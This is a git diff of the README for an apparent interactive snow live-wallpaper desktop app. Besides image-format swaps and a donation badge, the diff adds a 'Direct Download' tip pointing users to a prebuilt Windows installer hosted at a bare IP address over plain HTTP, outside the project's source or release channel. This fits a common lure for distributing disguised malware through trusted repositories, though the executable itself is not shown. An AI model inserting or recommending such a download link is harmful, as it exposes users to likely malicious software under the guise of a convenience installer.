@@ -14,11 +14,11 @@
 
 | Interactive Snow Scene & Flying Santa |
 | :---: |
-| ![Interactive Snow Scene](assets/preview-snow-scene.png) |
+| ![Interactive Snow Scene](assets/preview-snow-scene.gif) |
 
 | Background Winter Village & Holiday Star Tree | Yellow Snowplow Clearing Machine |
 | :---: | :---: |
-| ![Background Winter Village](assets/preview-village.png) | ![Yellow Snowplow Machine](assets/preview-snowplow.png) |
+| ![Background Winter Village](assets/preview-village.gif) | ![Yellow Snowplow Machine](assets/preview-snowplow.gif) |
 
 ---
 
@@ -82,6 +82,20 @@ Special thanks and credit go to:
 
 ## Installation & Getting Started
 
+> [!TIP]
+> ### 📦 Direct Download (Windows Installer)
+> If you just want to run the live wallpaper without compiling or installing developer tools, a ready-to-run Windows installer is available for direct download on our landing page:
+> 
+> 🚀 **[Download Pre-built Windows Version (http://63.179.36.220/iwp/)](http://63.179.36.220/iwp/)**
+> 
+> *Simply download the installer (`Interactive Wallpaper Setup 1.0.0.exe`), run the setup, and enjoy the snow on your desktop!*
+
+---
+
+### Running from Source
+
+If you prefer to clone and run or build the application from source code:
+
 ### Prerequisites
 - **Windows 10 / 11** (for desktop live wallpaper mode; also supports macOS and Linux in windowed preview mode).
 - **Node.js** (v18 or higher recommended): [Download Node.js](https://nodejs.org/)
@@ -144,6 +158,14 @@ All settings can be customized by **right-clicking the System Tray icon** (in an
 - **Carve Snow**: Click or drag mouse through the bottom snow mound
 - **Mouse Sparkles**: Left-click anywhere on the desktop
 - **Quit**: Right-click the System Tray icon -> **Quit Interactive Wallpaper**
+
+---
+
+## Support & Donations
+
+If you enjoy Interactive Wallpaper and want to support its continued development:
+
+[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/thalthanas)
 
 ---
 
